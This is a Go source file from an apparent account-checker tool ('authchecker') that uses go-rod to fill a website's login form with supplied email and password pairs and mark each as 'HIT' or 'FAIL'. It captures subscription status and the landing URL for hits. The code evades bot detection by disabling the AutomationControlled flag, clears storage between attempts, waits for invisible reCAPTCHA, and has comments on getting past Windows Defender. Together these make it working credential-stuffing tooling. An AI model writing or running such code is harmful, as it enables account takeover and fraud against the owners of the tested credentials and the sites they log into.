package browser

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"

	"authchecker/internal/config"
)

type Result struct {
	Status  string
	Detail  string
	Source  string
	Capture map[string]string
}

type LoginConfig struct {
	LoginURL          string
	SiteOrigin        string
	EmailSelector     string
	PassSelector      string
	CheckboxSelector  string
	PreClickSelectors []string
	SubmitSelector    string
	ChromePath        string
	WaitAfterLoad     int
	WaitAfterSubmit   int
	KeepOpenSeconds   int
	ClearStorage      bool
	Headless          bool
	Devtools          bool
	SuccessURL        string
	SuccessText       string
	FailText          string
	FailPageTexts     []string
	CheckSubscribe    bool
	SubscribeText     string
}

func FromYAML(cfg *config.Config) LoginConfig {
	b := cfg.Browser
	if b.WaitAfterLoad <= 0 {
		b.WaitAfterLoad = 3
	}
	if b.WaitAfterSubmit <= 0 {
		b.WaitAfterSubmit = 5
	}
	preClick := b.PreClickSelectors
	if b.CheckboxSelector != "" {
		preClick = append([]string{b.CheckboxSelector}, preClick...)
	}

	clearStorage := true
	if b.ClearStorage != nil {
		clearStorage = *b.ClearStorage
	}

	return LoginConfig{
		LoginURL:          b.LoginURL,
		SiteOrigin:        b.SiteOrigin,
		EmailSelector:     b.EmailSelector,
		PassSelector:      b.PassSelector,
		CheckboxSelector:  b.CheckboxSelector,
		PreClickSelectors: preClick,
		SubmitSelector:    b.SubmitSelector,
		ChromePath:        b.ChromePath,
		WaitAfterLoad:     b.WaitAfterLoad,
		WaitAfterSubmit:   b.WaitAfterSubmit,
		KeepOpenSeconds:   b.KeepOpenSeconds,
		ClearStorage:      clearStorage,
		Headless:          b.Headless,
		Devtools:          b.Devtools,
		SuccessURL:        b.SuccessURL,
		SuccessText:       b.SuccessText,
		FailText:          b.FailText,
		FailPageTexts:     b.FailPageTexts,
		CheckSubscribe:    b.CheckSubscribe,
		SubscribeText:     b.SubscribeText,
	}
}

func buildLauncher(cfg LoginConfig) *launcher.Launcher {
	l := launcher.New().
		Leakless(false). // Windows Defender blocks leakless.exe on RDP
		Headless(cfg.Headless).
		Set("disable-blink-features", "AutomationControlled").
		Set("window-size", "1280,900")

	chromePath := cfg.ChromePath
	if chromePath == "" {
		if found, ok := launcher.LookPath(); ok {
			chromePath = found
		}
	}
	if chromePath != "" {
		l = l.Bin(chromePath)
	}
	if cfg.Devtools {
		l = l.Devtools(true)
	}
	if cfg.ClearStorage {
		l = withFreshProfile(l)
	}
	return l
}

func Check(ctx context.Context, email, password string, cfg LoginConfig, rulesSuccess, rulesFail []config.Rule) Result {
	out := Result{Status: "ERROR", Capture: map[string]string{}}

	if cfg.LoginURL == "" || cfg.EmailSelector == "" || cfg.PassSelector == "" {
		out.Detail = "browser config incomplete: login_url, email_selector, pass_selector required"
		return out
	}

	l := buildLauncher(cfg)

	controlURL, err := l.Launch()
	if err != nil {
		out.Status = "RETRY"
		detail := "chrome launch failed: " + err.Error()
		if strings.Contains(strings.ToLower(err.Error()), "virus") ||
			strings.Contains(strings.ToLower(err.Error()), "leakless") {
			detail += " — Windows Defender ne block kiya; update pull karo (leakless off fix)"
		} else {
			detail += " — Google Chrome install karo ya browser.chrome_path set karo"
		}
		out.Detail = detail
		return out
	}
	defer l.Cleanup()
	defer l.Kill()
	if cfg.KeepOpenSeconds > 0 {
		defer time.Sleep(time.Duration(cfg.KeepOpenSeconds) * time.Second)
	}

	browser := rod.New().ControlURL(controlURL)
	if err := browser.Connect(); err != nil {
		out.Status = "RETRY"
		out.Detail = "browser connect: " + err.Error()
		return out
	}
	defer browser.MustClose()

	origin := siteOrigin(cfg.LoginURL, cfg.SiteOrigin)

	session, err := browser.Incognito()
	if err != nil {
		out.Status = "RETRY"
		out.Detail = "incognito session: " + err.Error()
		return out
	}
	defer session.MustClose()

	if cfg.ClearStorage {
		clearAllStorage(session, nil, origin)
	}

	page, err := session.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		out.Detail = err.Error()
		return out
	}
	defer func() {
		if cfg.ClearStorage {
			clearAllStorage(session, page, origin)
		}
		page.Close()
	}()

	if err := page.Navigate(cfg.LoginURL); err != nil {
		out.Detail = "navigate login: " + err.Error()
		return out
	}
	if cfg.ClearStorage {
		clearAllStorage(session, page, origin)
		_ = page.Reload()
	}

	page.MustWaitLoad()
	time.Sleep(time.Duration(cfg.WaitAfterLoad) * time.Second)

	emailEl, err := page.Element(cfg.EmailSelector)
	if err != nil {
		out.Detail = "email field not found: " + err.Error()
		return out
	}
	emailEl.MustSelectAllText().MustInput(email)

	passEl, err := page.Element(cfg.PassSelector)
	if err != nil {
		out.Detail = "password field not found: " + err.Error()
		return out
	}
	passEl.MustSelectAllText().MustInput(password)

	for _, sel := range cfg.PreClickSelectors {
		if err := clickPreAction(page, sel); err != nil {
			out.Detail = err.Error()
			return out
		}
	}

	// reCAPTCHA v3 invisible — browser mein auto-solve hone do
	time.Sleep(2 * time.Second)

	submitSel := cfg.SubmitSelector
	if submitSel == "" {
		submitSel = "button[type=submit]"
	}
	submit, err := page.Element(submitSel)
	if err != nil {
		out.Detail = "submit button not found: " + err.Error()
		return out
	}
	submit.MustClick()

	time.Sleep(time.Duration(cfg.WaitAfterSubmit) * time.Second)

	info, _ := page.Info()
	currentURL := ""
	if info != nil {
		currentURL = info.URL
	}
	html, _ := page.HTML()
	out.Source = html

	// API response capture via network — check page for fail/success text
	combined := html + "\n" + currentURL

	if msg := matchFailPage(combined, cfg); msg != "" {
		out.Status = "FAIL"
		out.Detail = msg
		return out
	}
	if cfg.SuccessURL != "" && strings.Contains(currentURL, cfg.SuccessURL) {
		out.Status = "HIT"
	} else if cfg.SuccessText != "" && strings.Contains(combined, cfg.SuccessText) {
		out.Status = "HIT"
	} else if evaluateRules(rulesSuccess, combined, 200, true) != "" {
		out.Status = "HIT"
	} else if evaluateRules(rulesFail, combined, 200, false) != "" {
		out.Status = "FAIL"
		return out
	} else if strings.Contains(currentURL, "/member") || strings.Contains(html, "Upgrade Plan") {
		out.Status = "HIT"
	} else {
		out.Status = "FAIL"
		out.Detail = "login did not reach success state"
		return out
	}

	if cfg.CheckSubscribe && cfg.SubscribeText != "" {
		if strings.Contains(html, cfg.SubscribeText) {
			out.Capture["subscription"] = "active"
		} else {
			out.Capture["subscription"] = "none"
		}
	}
	out.Capture["url"] = currentURL
	return out
}

func matchFailPage(combined string, cfg LoginConfig) string {
	texts := append([]string{cfg.FailText}, cfg.FailPageTexts...)
	texts = append(texts,
		"don't recognize that username or password",
		"We don't recognize that username or password",
		"credentialsInvalid",
		"invalid email or password",
	)
	seen := map[string]bool{}
	for _, t := range texts {
		t = strings.TrimSpace(t)
		if t == "" || seen[t] {
			continue
		}
		seen[t] = true
		if strings.Contains(combined, t) {
			return "invalid credentials — " + t
		}
	}
	return ""
}

func clickPreAction(page *rod.Page, selector string) error {
	el, err := page.Timeout(8 * time.Second).Element(selector)
	if err != nil {
		return fmt.Errorf("pre-click not found (%s): %w", selector, err)
	}

	// Hidden/native checkbox — label ya wrapper click
	tagName := strings.ToLower(el.MustEval(`() => this.tagName`).String())
	if tagName == "input" {
		inputType := strings.ToLower(el.MustEval(`() => this.type || ""`).String())
		if inputType == "checkbox" && el.MustEval(`() => this.checked`).Bool() {
			return nil
		}
	}

	el.MustScrollIntoView().MustClick()
	time.Sleep(300 * time.Millisecond)
	return nil
}

func evaluateRules(rules []config.Rule, source string, statusCode int, isSuccess bool) string {
	for _, rule := range rules {
		matched := false
		switch rule.Type {
		case "body_contains":
			matched = strings.Contains(source, rule.Value)
		case "body_not_contains":
			matched = !strings.Contains(source, rule.Value)
		}
		if matched {
			if isSuccess {
				return "HIT"
			}
			return "FAIL"
		}
	}
	return ""
}
